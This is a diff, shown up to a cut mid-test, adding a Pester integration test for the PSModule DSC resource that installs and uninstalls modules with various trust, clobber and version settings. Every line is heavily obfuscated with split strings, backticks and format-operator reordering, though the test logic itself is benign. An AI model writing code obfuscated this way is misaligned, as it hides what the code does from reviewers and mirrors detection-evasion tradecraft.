@@ -1,0 +1,483 @@
+${Sc`Ri`p`T`:DSCrESoU`RCe`F`RiEn`dl`Yname} = ("{1}{2}{0}" -f 'e','PSMo','dul')
+${SCR`IP`T:D`cSREsOU`RcEnA`mE} = "MSFT_$($script:dscResourceFriendlyName)"
+
+
+${cO`N`Fi`gura`Tio`Nfile} = &("{1}{2}{0}" -f 'th','Jo','in-Pa') -Path ${PsS`cRiPTRo`oT} -ChildPath "$($script:dcsResourceName).config.ps1"
+. ${co`NFi`Gu`RA`TIonFI`le}
+
+&("{1}{2}{0}" -f'ibe','Des','cr') "$($script:dcsResourceName)_Integration" {
+    ${COnfI`gURA`TIOn`NAME} = "$($script:dcsResourceName)_SetPackageSourceAsNotTrusted_Config"
+
+    &("{2}{1}{0}" -f 'xt','onte','C') ('When using configuration {0}' -f ${cOnf`I`GU`RatiON`Na`me}) {
+        &('It') ("{1}{3}{8}{7}{9}{6}{2}{5}{4}{0}" -f'wing','Sho','t','u','thro',' ',' MOF withou','mpile','ld co',' and apply the') {
+            {
+                ${ConfiGUrATIo`Np`ArAMet`E`Rs} = @{
+                    ("{2}{0}{1}" -f 'P','ath','Output')        = ${tEST`D`RIVE}
+                    ("{0}{1}{2}{3}" -f'Configura','t','ionD','ata') = ${confI`GU`RAtI`oNDATa}
+                }
+
+                & ${ConF`iG`UrATIo`N`N`AME} @configurationParameters
+
+                ${sTA`Rt`dSCc`onfIGuratiOnParAm`EtE`Rs} = @{
+                    ("{0}{1}" -f 'P','ath')         = ${TEST`Dr`IvE}
+                    ("{1}{0}{2}" -f 'mputer','Co','Name') = ("{0}{3}{1}{2}" -f 'lo','h','ost','cal')
+                    ("{1}{0}" -f 'ait','W')         = ${TR`UE}
+                    ("{1}{0}{2}"-f 'rbo','Ve','se')      = ${T`Rue}
+                    ("{1}{0}"-f'ce','For')        = ${tr`UE}
+                    ("{1}{2}{0}" -f 'on','E','rrorActi')  = ("{1}{0}"-f 'top','S')
+                }
+
+                &("{4}{3}{5}{2}{0}{6}{1}"-f 'fig','on','n','t-','Star','DscCo','urati') @startDscConfigurationParameters
+            } | &("{1}{0}"-f'ld','Shou') -Not -Throw
+        }
+    }
+
+    ${CON`FI`GU`R`AtIOnNamE} = "$($script:dcsResourceName)_InstallWithTrusted_Config"
+
+    &("{1}{0}"-f'ext','Cont') ('When using configuration {0}' -f ${cOn`FiGuRAtI`onN`AmE}) {
+        &('It') ("{8}{3}{1}{6}{5}{2}{7}{9}{0}{4}"-f 'o','ld compile and ','MOF with','hou','wing','y the ','appl','o','S','ut thr') {
+            {
+                ${ConFiG`U`RAt`Ionpara`mEteRs} = @{
+                    ("{0}{2}{1}"-f'O','Path','utput')        = ${te`std`RI`VE}
+                    ("{2}{0}{3}{4}{1}"-f'ur','ionData','Config','a','t') = ${C`OnfIg`URatio`N`DaTA}
+                }
+
+                & ${co`N`F`IGu`RATIoN`Name} @configurationParameters
+
+                ${STaRtd`sCC`O`NFigURAT`iOnpARAM`eTE`Rs} = @{
+                    ("{1}{0}"-f'h','Pat')         = ${TesTdR`i`VE}
+                    ("{2}{1}{0}" -f'puterName','m','Co') = ("{2}{0}{1}" -f'cal','host','lo')
+                    ("{1}{0}" -f 'ait','W')         = ${T`RUE}
+                    ("{1}{0}" -f 'ose','Verb')      = ${T`RUe}
+                    ("{1}{0}"-f 'ce','For')        = ${tR`UE}
+                    ("{0}{1}{3}{2}" -f'Er','ror','n','Actio')  = ("{1}{0}"-f'top','S')
+                }
+
+                &("{1}{0}{2}{3}"-f 'tart-DscC','S','o','nfiguration') @startDscConfigurationParameters
+            } | &("{0}{1}" -f'Sh','ould') -Not -Throw
+        }
+
+        &('It') ("{16}{5}{14}{15}{9}{13}{1}{3}{17}{7}{11}{8}{2}{6}{0}{4}{10}{12}"-f'w','a','ion','ll Get','ithout','d',' ','nf','gurat','able ',' th','i','rowing','to c',' ','be ','Shoul','-DscCo') {
+            {
+                ${s`crIPT`:CUrRe`NtcOn`FIg`Ur`Ati`on} = &("{1}{0}{2}{3}" -f 'et-D','G','scConfigurat','ion') -Verbose -ErrorAction ("{0}{1}" -f 'S','top')
+            } | &("{1}{0}" -f'hould','S') -Not -Throw
+        }
+
+        &('It') ("{12}{2}{13}{5}{11}{6}{9}{3}{0}{4}{14}{10}{7}{8}{1}"-f' and ','ch','h','e resource','all the para','ld h','e','ld ma','t',' set th','eters shou','av','S','ou','m') {
+            ${RE`SoURce`cURR`ENtS`T`A`Te} = ${sC`RIpT:CuRre`N`TCO`N`Figur`A`TIon} | &("{2}{1}{3}{0}"-f't','her','W','e-Objec') -FilterScript {
+                ${_}."C`Onf`i`gu`RaT`IonnamE" -eq ${C`onFI`gurATiO`N`NamE} `
+                    -and ${_}."rE`SOuR`Ceid" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${R`E`So`UR`CEcuRreNTStAtE}."ens`URE" | &("{1}{0}"-f'hould','S') -Be ("{1}{2}{0}" -f 't','Pr','esen')
+            ${REs`OURc`EcUR`R`EnTSt`A`TE}."nA`ME" | &("{1}{0}" -f'ould','Sh') -Be ${CONFi`gura`TIOn`Da`Ta}."aLLN`oDEs"."Mod`U`le1_n`Ame"
+            ${re`s`O`U`RCecURre`NtST`AtE}."INs`T`ALlAtIonP`OLiCy" | &("{0}{1}" -f'Sh','ould') -Be ("{3}{1}{2}{0}" -f'ted','ru','s','Unt')
+        }
+
+        &('It') ('Sho'+'uld '+'retu'+'r'+'n '+('xSO'+'t'+'rue ')."RE`PLAcE"(([ChaR]120+[ChaR]83+[ChaR]79),'$')+'w'+'hen '+'Test'+'-D'+'scCon'+'figur'+'a'+'tion '+'i'+'s '+'r'+'un') {
+            &("{0}{1}{4}{2}{3}"-f'Test-Ds','cC','nfigurati','on','o') -Verbose | &("{0}{1}" -f 'Sh','ould') -Be ${t`RUE}
+        }
+    }
+
+    ${cONFI`G`URAti`On`NAmE} = "$($script:dcsResourceName)_UninstallModule1_Config"
+
+    &("{0}{2}{1}"-f 'C','t','ontex') ('When using configuration {0}' -f ${COn`FiGUrATi`o`Nn`Ame}) {
+        &('It') ("{6}{4}{0}{2}{8}{3}{9}{7}{1}{5}{10}" -f' ','e MOF w','co','il','ould','ithou','Sh','ply th','mp','e and ap','t throwing') {
+            {
+                ${co`NF`iG`UrAtIonpAR`AMetErS} = @{
+                    ("{0}{2}{1}"-f'OutputP','h','at')        = ${T`esTdR`IVE}
+                    ("{5}{3}{1}{0}{4}{2}" -f 'ur','g','a','onfi','ationDat','C') = ${C`o`Nf`igurA`TioNda`TA}
+                }
+
+                & ${cO`NfIGUrAtIo`NNa`Me} @configurationParameters
+
+                ${StaR`TDsccoN`FIGuR`Atio`Np`A`RA`me`Te`RS} = @{
+                    ("{1}{0}" -f 'ath','P')         = ${te`STDRI`Ve}
+                    ("{3}{2}{1}{0}" -f 'uterName','p','m','Co') = ("{2}{0}{1}" -f'ca','lhost','lo')
+                    ("{1}{0}" -f't','Wai')         = ${tR`UE}
+                    ("{0}{2}{1}"-f'Ve','ose','rb')      = ${TR`Ue}
+                    ("{1}{0}"-f 'e','Forc')        = ${tr`Ue}
+                    ("{1}{2}{0}" -f'on','Err','orActi')  = ("{0}{1}"-f'S','top')
+                }
+
+                &("{4}{3}{0}{2}{1}"-f'nfi','n','guratio','t-DscCo','Star') @startDscConfigurationParameters
+            } | &("{0}{1}{2}"-f'S','h','ould') -Not -Throw
+        }
+
+        &('It') ("{0}{6}{11}{10}{3}{4}{8}{9}{13}{2}{5}{12}{14}{1}{7}" -f 'S','throwin','ra',' abl','e to ','tion w','h','g','call Get-Ds','cConfig','e','ould b','itho','u','ut ') {
+            {
+                ${SCr`I`Pt:`CURreNTCo`N`FIguraT`ion} = &("{4}{0}{1}{2}{3}"-f 'Configurat','i','o','n','Get-Dsc') -Verbose -ErrorAction ("{1}{0}" -f 'top','S')
+            } | &("{1}{0}" -f 'd','Shoul') -Not -Throw
+        }
+
+        &('It') ("{2}{5}{9}{10}{13}{1}{0}{7}{3}{8}{12}{6}{11}{4}"-f 'e ','urc','Sh','nd all ','uld match','ou','ame','a','the p','ld have se','t the re','ters sho','ar','so') {
+            ${reSO`Urce`c`U`Rr`En`TstaTE} = ${ScrI`p`T:cURR`Ent`CoNF`i`gu`RaTioN} | &("{0}{2}{1}" -f'Where-','bject','O') -FilterScript {
+                ${_}."CoN`FIGUr`ATIOnn`Ame" -eq ${cONfIGURaTIoN`N`A`me} `
+                    -and ${_}."res`oU`Rceid" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${REs`O`UrCE`CU`Rr`E`NTsTATe}."E`NsuRE" | &("{0}{1}"-f'Shoul','d') -Be ("{0}{1}"-f'Absen','t')
+            ${RE`soU`RcecurrENT`st`ATE}."nA`Me" | &("{1}{0}"-f 'uld','Sho') -Be ${Con`Fi`gUraTIoN`dATa}."a`lLNODeS"."mod`ULe1_`N`AmE"
+        }
+
+        &('It') ('Sho'+'uld'+' '+'re'+'turn'+' '+('{0'+'}'+'tru'+'e ')-F  [CHar]36+'when'+' '+'Test-DscC'+'on'+'fig'+'ura'+'tion '+'i'+'s '+'r'+'un') {
+            &("{2}{0}{1}{3}{4}" -f'Dsc','Con','Test-','figur','ation') -Verbose | &("{2}{0}{1}" -f'hou','ld','S') -Be ${t`Rue}
+        }
+    }
+
+    ${con`FiG`UR`ATioNn`AMe} = "$($script:dcsResourceName)_SetPackageSourceAsTrusted_Config"
+
+    &("{0}{2}{1}"-f 'C','ext','ont') ('When using configuration {0}' -f ${Con`FigU`RAt`iOn`Name}) {
+        &('It') ("{7}{3}{6}{9}{2}{8}{4}{5}{0}{1}"-f'tho','ut throwing','h','compile and ','OF w','i','app','Should ','e M','ly t') {
+            {
+                ${C`onf`iGURA`TioNP`A`Ram`eTeRS} = @{
+                    ("{0}{1}{2}" -f 'Ou','tpu','tPath')        = ${teS`TDr`I`Ve}
+                    ("{3}{0}{1}{2}" -f 't','ionDat','a','Configura') = ${Co`NFIgu`RaT`Ion`Da`TA}
+                }
+
+                & ${c`on`FigUrATiONn`AME} @configurationParameters
+
+                ${stAr`TD`s`CconF`IgUrATI`oNPAra`m`eT`ers} = @{
+                    ("{0}{1}" -f 'Pa','th')         = ${tesTDr`i`VE}
+                    ("{3}{2}{0}{1}"-f'uterN','ame','mp','Co') = ("{2}{0}{1}" -f'cal','host','lo')
+                    ("{0}{1}"-f'W','ait')         = ${T`RUE}
+                    ("{0}{2}{1}"-f 'Ver','ose','b')      = ${tr`UE}
+                    ("{0}{1}"-f'For','ce')        = ${T`RUE}
+                    ("{1}{2}{0}"-f'Action','Err','or')  = ("{0}{1}" -f 'Sto','p')
+                }
+
+                &("{0}{2}{1}{4}{3}"-f 'St','nfigu','art-DscCo','tion','ra') @startDscConfigurationParameters
+            } | &("{1}{2}{0}" -f 'uld','Sh','o') -Not -Throw
+        }
+    }
+
+    ${con`Fi`Gu`R`Ation`NaME} = "$($script:dcsResourceName)_DefaultParameters_Config"
+
+    &("{1}{0}{2}" -f 'nte','Co','xt') ('When using configuration {0}' -f ${COn`FigURati`on`Name}) {
+        &('It') ("{2}{4}{0}{3}{5}{6}{7}{1}" -f 'ap','ng','Should ','pl','compile and ','y the',' MO','F without throwi') {
+            {
+                ${coNF`Igur`AT`iO`NpaR`AmeTERs} = @{
+                    ("{1}{2}{0}" -f 'Path','Outpu','t')        = ${Testd`RI`Ve}
+                    ("{0}{3}{5}{2}{4}{1}" -f 'Config','ata','tio','ur','nD','a') = ${co`NFigu`RATiON`d`ATa}
+                }
+
+                & ${C`onFigur`A`T`IoNnA`me} @configurationParameters
+
+                ${S`T`ArTdsc`cO`Nfigurati`O`N`P`ARAMETe`Rs} = @{
+                    ("{0}{1}"-f'Pa','th')         = ${Te`Stdr`iVe}
+                    ("{2}{0}{3}{1}"-f 'om','e','C','puterNam') = ("{0}{1}{2}"-f 'loca','l','host')
+                    ("{1}{0}" -f'ait','W')         = ${T`RUE}
+                    ("{0}{2}{1}" -f 'Ve','se','rbo')      = ${tR`UE}
+                    ("{1}{0}" -f 'e','Forc')        = ${tR`UE}
+                    ("{2}{1}{0}{3}" -f'o','rr','E','rAction')  = ("{1}{0}"-f'p','Sto')
+                }
+
+                &("{1}{0}{6}{2}{3}{5}{4}"-f'tart-','S','scCo','nfig','tion','ura','D') @startDscConfigurationParameters
+            } | &("{1}{0}" -f 'ld','Shou') -Not -Throw
+        }
+
+        &('It') ("{7}{8}{1}{5}{9}{2}{11}{4}{3}{12}{10}{0}{6}"-f'owi','u','l G','cC','s','ld b','ng','Sh','o','e able to cal','iguration without thr','et-D','onf') {
+            {
+                ${sCRiPT:`cuRrENt`ConFI`Gu`Ration} = &("{3}{5}{0}{4}{2}{1}"-f'c','ration','figu','Ge','Con','t-Ds') -Verbose -ErrorAction ("{0}{1}"-f'St','op')
+            } | &("{1}{2}{0}"-f'ould','S','h') -Not -Throw
+        }
+
+        &('It') ("{3}{4}{1}{13}{12}{5}{2}{7}{0}{9}{6}{11}{10}{8}" -f'rce and ',' ','t the r','Shou','ld','se','l the parame','esou','hould match','al','s','ters ','e ','hav') {
+            ${ResoUr`CeCUR`RENT`StA`Te} = ${Sc`Rip`T:c`URreN`TCO`NFigurat`ION} | &("{2}{1}{0}"-f 'bject','-O','Where') -FilterScript {
+                ${_}."coNFI`guRAtion`Na`Me" -eq ${C`oN`FIgUr`ATiOnNAmE} `
+                    -and ${_}."rEsou`RcE`id" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${REsoU`Rce`CurrEn`T`staTe}."EnS`UrE" | &("{0}{1}"-f'Shoul','d') -Be ("{0}{1}" -f 'Prese','nt')
+            ${rEsou`R`CEC`U`R`ReNTsTa`TE}."Na`Me" | &("{1}{0}"-f'd','Shoul') -Be ${c`OnFi`g`UratioND`AtA}."A`L`LNOdes"."M`ODUlE1`_n`Ame"
+        }
+
+        &('It') ('S'+'hould'+' '+'ret'+'urn'+' '+('{0'+'}true ')  -f [ChaR]36+'w'+'hen '+'T'+'es'+'t-DscConfigu'+'rati'+'o'+'n '+'i'+'s '+'ru'+'n') {
+            &("{1}{2}{3}{0}{4}"-f'tio','Test-Dsc','Confi','gura','n') -Verbose | &("{1}{0}" -f 'd','Shoul') -Be ${t`RuE}
+        }
+    }
+
+    ${c`ONFi`GURATiON`N`Ame} = "$($script:dcsResourceName)_UsingAllowClobber_Config"
+
+    &("{0}{2}{1}"-f 'Conte','t','x') ('When using configuration {0}' -f ${cOnfIgurA`TiO`N`Na`me}) {
+        &('It') ("{2}{4}{0}{8}{1}{5}{6}{7}{3}"-f 'u',' apply th','Sh','wing','o','e MOF wi','thout ','thro','ld compile and') {
+            {
+                ${CoNf`ig`URa`TioNpa`Ra`ME`T`eRs} = @{
+                    ("{1}{2}{0}"-f 'ath','Output','P')        = ${T`e`sTDrive}
+                    ("{2}{0}{3}{1}"-f 'ur','ta','Config','ationDa') = ${confI`G`URatI`ON`DatA}
+                }
+
+                & ${CO`NF`ig`U`RAtioNname} @configurationParameters
+
+                ${STar`T`dSccOnfiGuRaT`I`O`Np`Ar`AMe`TErs} = @{
+                    ("{1}{0}" -f 'th','Pa')         = ${TES`TD`RiVE}
+                    ("{0}{2}{1}{3}"-f 'Comput','rN','e','ame') = ("{0}{1}{2}" -f 'lo','c','alhost')
+                    ("{0}{1}" -f 'Wai','t')         = ${T`Rue}
+                    ("{1}{0}"-f'erbose','V')      = ${tR`UE}
+                    ("{0}{1}" -f'Fo','rce')        = ${t`RUe}
+                    ("{2}{0}{3}{1}"-f'rr','ction','E','orA')  = ("{0}{1}" -f'Sto','p')
+                }
+
+                &("{2}{0}{1}{3}{4}"-f 'DscConfigu','rat','Start-','i','on') @startDscConfigurationParameters
+            } | &("{1}{0}"-f 'ould','Sh') -Not -Throw
+        }
+
+        &('It') ("{11}{10}{9}{8}{0}{7}{6}{4}{5}{12}{13}{3}{2}{1}{14}"-f 'le','u','o',' with','all',' Get-Ds','to c',' ','ab',' ','ld be','Shou','cConfiguratio','n','t throwing') {
+            {
+                ${sCRiP`T`:CuRrE`N`TcoNfiGUr`A`T`i`On} = &("{1}{0}{3}{2}"-f'DscConf','Get-','on','igurati') -Verbose -ErrorAction ("{1}{0}" -f 'p','Sto')
+            } | &("{0}{1}" -f 'S','hould') -Not -Throw
+        }
+
+        &('It') ("{16}{14}{4}{1}{9}{5}{15}{11}{0}{17}{13}{3}{12}{7}{10}{8}{2}{6}" -f ' ',' the','at','arame','d have set','o','ch','sho','m',' res','uld ','e and','ters ',' p','oul','urc','Sh','all the') {
+            ${rESO`U`Rc`ec`UrREN`T`sTAtE} = ${SC`R`IpT:`cUrREnTc`ONFiguRa`T`iON} | &("{2}{1}{0}" -f 'ject','-Ob','Where') -FilterScript {
+                ${_}."cOnFi`gURA`TI`ONNaME" -eq ${confI`GUraTi`oN`NA`me} `
+                    -and ${_}."Re`soUrc`eid" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${re`SOuR`c`EcUrR`en`TSTA`TE}."e`N`SUrE" | &("{0}{1}" -f'S','hould') -Be ("{0}{2}{1}" -f'Prese','t','n')
+            ${r`esOurcecuRRen`T`sTa`TE}."Na`me" | &("{2}{1}{0}"-f 'd','oul','Sh') -Be ${CON`FI`gUR`ATi`ONDaTa}."a`lLno`DES"."MO`Du`L`e2_naME"
+        }
+
+        &('It') ('Sho'+'uld '+'re'+'turn'+' '+('{0}tr'+'ue ') -F  [ChAR]36+'wh'+'en '+'Test-'+'D'+'s'+'cC'+'onfig'+'uration'+' '+'i'+'s '+'r'+'un') {
+            &("{2}{4}{0}{3}{1}" -f 'scCon','on','Te','figurati','st-D') -Verbose | &("{1}{0}{2}"-f 'l','Shou','d') -Be ${T`Rue}
+        }
+    }
+
+    ${c`O`N`F`igURAtIO`NNaMe} = "$($script:dcsResourceName)_UninstallModule2_Config"
+
+    &("{0}{1}" -f 'Cont','ext') ('When using configuration {0}' -f ${C`onfig`Urati`onnA`me}) {
+        &('It') ("{8}{6}{4}{5}{7}{1}{9}{10}{2}{3}{0}"-f 'wing','d app',' MOF wi','thout thro',' ','a','mpile','n','Should co','ly',' the') {
+            {
+                ${CO`NfIG`URA`TIoN`PARA`meTeRS} = @{
+                    ("{2}{1}{0}" -f'ath','putP','Out')        = ${TesTdr`I`VE}
+                    ("{2}{3}{1}{0}" -f'ta','a','Configuration','D') = ${coN`FigUR`A`TioNDATA}
+                }
+
+                & ${coNF`i`GuratI`o`NnA`mE} @configurationParameters
+
+                ${sTArTDS`CCOn`FiGuRatIO`NPARAmE`TE`RS} = @{
+                    ("{1}{0}"-f 'th','Pa')         = ${teStd`Ri`VE}
+                    ("{0}{2}{1}{3}"-f 'Comp','rNa','ute','me') = ("{3}{1}{0}{2}"-f 'cal','o','host','l')
+                    ("{1}{0}" -f't','Wai')         = ${tr`Ue}
+                    ("{0}{2}{1}" -f'Ve','bose','r')      = ${tR`Ue}
+                    ("{0}{1}" -f'F','orce')        = ${T`Rue}
+                    ("{1}{2}{3}{0}" -f 'Action','E','rro','r')  = ("{1}{0}" -f'top','S')
+                }
+
+                &("{5}{1}{4}{0}{3}{2}" -f 'a','n','n','tio','figur','Start-DscCo') @startDscConfigurationParameters
+            } | &("{0}{2}{1}"-f'Sh','uld','o') -Not -Throw
+        }
+
+        &('It') ("{6}{8}{5}{17}{10}{9}{0}{4}{3}{7}{15}{2}{13}{1}{14}{12}{11}{16}" -f 'l Get','tho','ati','Dsc','-','be ','Shou','Configu','ld ','to cal',' ','i','row','on wi','ut th','r','ng','able') {
+            {
+                ${S`cR`iP`T:cURR`E`NTCOnF`iguR`At`IoN} = &("{1}{5}{6}{2}{3}{4}{0}" -f 'ion','Ge','igu','ra','t','t-DscC','onf') -Verbose -ErrorAction ("{0}{1}" -f'St','op')
+            } | &("{1}{0}"-f'ld','Shou') -Not -Throw
+        }
+
+        &('It') ("{11}{4}{1}{0}{9}{6}{10}{7}{8}{2}{3}{5}" -f'so','t the re','ma','tc','ave se','h','all','he parameters sh','ould ','urce and ',' t','Should h') {
+            ${RE`sO`U`RcEcurrent`S`T`ATe} = ${SCR`iPT:CUrReNtCOnFI`GUR`A`T`iOn} | &("{3}{0}{2}{1}" -f'he','t','re-Objec','W') -FilterScript {
+                ${_}."COnf`iGu`RA`TIon`Na`ME" -eq ${cO`NfIgURaTioN`N`Ame} `
+                    -and ${_}."R`es`OUrCEId" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${ResourC`eC`URr`enTSt`Ate}."Ens`URe" | &("{1}{0}" -f 'hould','S') -Be ("{1}{0}{2}" -f 's','Ab','ent')
+            ${r`ESoUrCEcu`RR`E`NTST`Ate}."Na`ME" | &("{0}{2}{1}" -f'S','ould','h') -Be ${C`on`FiguRaTionDa`Ta}."A`LlNODEs"."mOd`U`LE`2_nAMe"
+        }
+
+        &('It') ('Should'+' '+'ret'+'ur'+'n '+('{'+'0}tr'+'ue ')  -F [Char]36+'w'+'hen '+'Test'+'-DscCon'+'fi'+'gu'+'r'+'atio'+'n '+'is'+' '+'r'+'un') {
+            &("{4}{1}{0}{3}{2}"-f'-D','est','n','scConfiguratio','T') -Verbose | &("{1}{0}"-f 'ld','Shou') -Be ${t`RuE}
+        }
+    }
+
+    ${C`ONfig`Ur`AtIOnnaMe} = "$($script:dcsResourceName)_RequiredVersion_Config"
+
+    &("{1}{2}{0}"-f 'ext','C','ont') ('When using configuration {0}' -f ${co`NfiGU`RatIoN`Name}) {
+        &('It') ("{7}{8}{12}{1}{0}{4}{5}{11}{9}{6}{3}{2}{10}"-f'compi',' ','t','he MOF without ','le ','a','ly t','Sh','oul','d app','hrowing','n','d') {
+            {
+                ${C`O`Nf`I`gUraTIO`NPARaM`EtERs} = @{
+                    ("{1}{2}{0}"-f 'tPath','Outp','u')        = ${t`e`StDRiVE}
+                    ("{1}{5}{2}{0}{4}{3}" -f'o','Conf','ati','a','nDat','igur') = ${Co`NFI`g`URA`TIondAta}
+                }
+
+                & ${Con`Fig`URatIo`NNaMe} @configurationParameters
+
+                ${Sta`RTdScCoNfIGUr`A`TioN`PAr`AMETErS} = @{
+                    ("{1}{0}"-f 'ath','P')         = ${t`Es`Td`RIvE}
+                    ("{2}{1}{0}"-f'ame','uterN','Comp') = ("{3}{1}{0}{2}"-f 'o','calh','st','lo')
+                    ("{1}{0}" -f'it','Wa')         = ${tr`Ue}
+                    ("{1}{2}{0}" -f 'bose','Ve','r')      = ${T`RUE}
+                    ("{0}{1}"-f 'Forc','e')        = ${T`Rue}
+                    ("{1}{0}{2}"-f 'rA','Erro','ction')  = ("{0}{1}" -f 'Sto','p')
+                }
+
+                &("{0}{4}{1}{2}{3}" -f 'S','Dsc','Conf','iguration','tart-') @startDscConfigurationParameters
+            } | &("{0}{1}" -f'Shoul','d') -Not -Throw
+        }
+
+        &('It') ("{4}{0}{16}{8}{1}{9}{11}{12}{7}{2}{6}{5}{14}{10}{13}{3}{15}" -f 'o','ble to','scCo','in','Sh','atio','nfigur','-D',' be a',' cal','without ','l',' Get','throw','n ','g','uld') {
+            {
+                ${s`CrIPT:cUrRE`N`TcONfIg`Urat`ION} = &("{3}{1}{0}{4}{2}" -f'Dsc','t-','figuration','Ge','Con') -Verbose -ErrorAction ("{1}{0}"-f'p','Sto')
+            } | &("{0}{1}" -f 'Sh','ould') -Not -Throw
+        }
+
+        &('It') ("{14}{15}{1}{8}{11}{2}{4}{6}{3}{5}{12}{10}{13}{7}{9}{0}"-f 'match','d','th','n','e ','d all','resource a','ameters shou',' hav','ld ','the ','e set ',' ','par','Shou','l') {
+            ${REsou`RcEcu`RrenTS`T`ATe} = ${ScR`I`PT:`cuRren`TC`OnFi`gU`RATiON} | &("{2}{0}{3}{1}" -f 'here-O','ect','W','bj') -FilterScript {
+                ${_}."CO`NF`igURA`TIOnN`AME" -eq ${COnfI`GUra`T`IoNnaME} `
+                    -and ${_}."re`s`OuRCEID" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${REsoU`R`C`EcUr`RentST`ATE}."EnS`URE" | &("{0}{1}{2}"-f 'Sho','u','ld') -Be ("{2}{0}{1}"-f 'e','sent','Pr')
+            ${R`eSOurCE`CuR`REn`T`state}."na`mE" | &("{1}{0}"-f 'uld','Sho') -Be ${c`ONfiGu`RaTiOND`Ata}."aLlnO`DEs"."moduLE2_n`A`mE"
+            ${Re`s`ource`CUrreN`T`sTA`Te}."inS`TALL`Ed`VERSI`ON" | &("{2}{1}{0}" -f 'ould','h','S') -Be ${coN`F`igURaTIon`Da`Ta}."AL`l`NODeS"."MO`dU`lE2_req`Ui`RedveRsiOn"
+        }
+
+        &('It') ('S'+'h'+'ould '+'r'+'eturn'+' '+('c'+'Xwtrue'+' ')."rep`la`cE"('cXw',[stRiNg][CHar]36)+'wh'+'en '+'Test-D'+'scConfi'+'gu'+'r'+'at'+'ion '+'is'+' '+'r'+'un') {
+            &("{3}{2}{4}{1}{0}" -f 'n','o','Ds','Test-','cConfigurati') -Verbose | &("{0}{1}"-f'S','hould') -Be ${t`RuE}
+        }
+    }
+
+    
+    ${CONF`Igu`RaTiON`Na`ME} = "$($script:dcsResourceName)_VersionRange_Config"
+
+    &("{2}{1}{0}" -f'xt','onte','C') ('When using configuration {0}' -f ${cONF`i`gU`RaT`iOn`Name}) {
+        &('It') ("{2}{8}{5}{12}{3}{6}{10}{4}{11}{0}{9}{1}{7}" -f 'e MOF','ut throwi','Sh','i','pply',' ','le ','ng','ould',' witho','and a',' th','comp') {
+            {
+                ${c`o`N`FIguRAt`IOnpArAMEteRS} = @{
+                    ("{1}{0}{2}"-f'P','Output','ath')        = ${tE`s`T`DrIvE}
+                    ("{2}{3}{4}{1}{0}" -f'nData','io','C','onfigura','t') = ${cONFigu`R`Ation`DA`TA}
+                }
+
+                & ${COnfI`g`URAT`iONna`me} @configurationParameters
+
+                ${staR`TDscC`oNfIgurAt`ionpA`RAMEt`eRs} = @{
+                    ("{1}{0}"-f 'h','Pat')         = ${TeS`TdRi`Ve}
+                    ("{1}{2}{3}{0}" -f 'e','C','omputer','Nam') = ("{1}{0}" -f't','localhos')
+                    ("{1}{0}"-f'it','Wa')         = ${tR`UE}
+                    ("{1}{0}"-f 'bose','Ver')      = ${T`Rue}
+                    ("{0}{1}" -f 'For','ce')        = ${TR`UE}
+                    ("{2}{1}{0}" -f 'ction','rorA','Er')  = ("{1}{0}"-f 'op','St')
+                }
+
+                &("{4}{2}{5}{6}{3}{1}{0}" -f'uration','fig','tar','n','S','t','-DscCo') @startDscConfigurationParameters
+            } | &("{1}{0}" -f'uld','Sho') -Not -Throw
+        }
+
+        &('It') ("{8}{2}{10}{7}{3}{0}{9}{4}{1}{5}{6}"-f'DscC','fi','ou',' Get-','n','guration without th','rowing','o call','Sh','o','ld be able t') {
+            {
+                ${s`CRIPt:C`UrreNTconFi`G`UR`AtIOn} = &("{4}{3}{0}{2}{1}"-f 'o','uration','nfig','cC','Get-Ds') -Verbose -ErrorAction ("{1}{0}"-f'op','St')
+            } | &("{1}{0}"-f'ld','Shou') -Not -Throw
+        }
+
+        &('It') ("{10}{2}{12}{9}{6}{14}{7}{0}{11}{1}{3}{8}{5}{15}{4}{13}"-f 'h','paramet','hould have','e','hould ','s','ur','l t','r','eso','S','e ',' set the r','match','ce and al',' s') {
+            ${RE`s`ou`RceCURrE`Nts`TAte} = ${scripT`:cuR`RenTconFiGUR`A`TIon} | &("{0}{2}{3}{1}" -f 'Wh','ject','ere-','Ob') -FilterScript {
+                ${_}."CoNfI`g`UR`ATionn`A`Me" -eq ${COn`FIGUraTi`O`NNAmE} `
+                    -and ${_}."re`S`OurCeiD" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${rESO`UR`ce`c`UrrENT`sT`ATE}."E`N`SuRe" | &("{1}{0}" -f'ould','Sh') -Be ("{2}{0}{1}" -f 'e','nt','Pres')
+            ${Re`S`Our`CECU`RRentstAtE}."n`AmE" | &("{1}{0}{2}"-f'hou','S','ld') -Be ${c`onFI`GUraT`IoNDA`Ta}."al`lNod`ES"."Mo`du`L`E2_NAme"
+            ${RE`Sou`RCEcUrr`enTSTATE}."I`NsTALLEd`VERsION" | &("{1}{0}" -f 'd','Shoul') -Be ${cONFigu`R`ATiOnD`ATa}."aLL`No`Des"."M`OD`UlE2_REq`UirE`DVer`si`on"
+        }
+
+        &('It') ('Sh'+'ould '+'retur'+'n '+('tLs'+'tr'+'ue ').("{1}{0}"-f 'EplAce','R').Invoke('tLs','$')+'w'+'hen '+'Test-Dsc'+'Confi'+'gu'+'ratio'+'n '+'is'+' '+'r'+'un') {
+            &("{0}{6}{3}{1}{4}{2}{5}" -f 'Test-','r','io','Configu','at','n','Dsc') -Verbose | &("{0}{2}{1}" -f'Sh','d','oul') -Be ${tR`UE}
+        }
+    }
+
+    ${cOnF`iGU`R`ATIOn`Name} = "$($script:dcsResourceName)_UninstallModule2_Config"
+
+    &("{2}{0}{1}" -f 'ex','t','Cont') ('When using configuration {0}' -f ${CONFIG`UR`ATIon`NA`ME}) {
+        &('It') ("{0}{11}{2}{5}{8}{3}{7}{6}{4}{12}{1}{10}{9}" -f'Should','t ','mpi','y ','h','le','t','the MOF wi',' and appl','hrowing','t',' co','ou') {
+            {
+                ${cOnfIGUR`A`TIOnP`A`Ram`E`TerS} = @{
+                    ("{2}{1}{0}" -f 'ath','tputP','Ou')        = ${TES`Td`Ri`VE}
+                    ("{0}{1}{2}{4}{3}" -f 'C','on','figura','onData','ti') = ${CoNFIGuRAtIO`N`Da`TA}
+                }
+
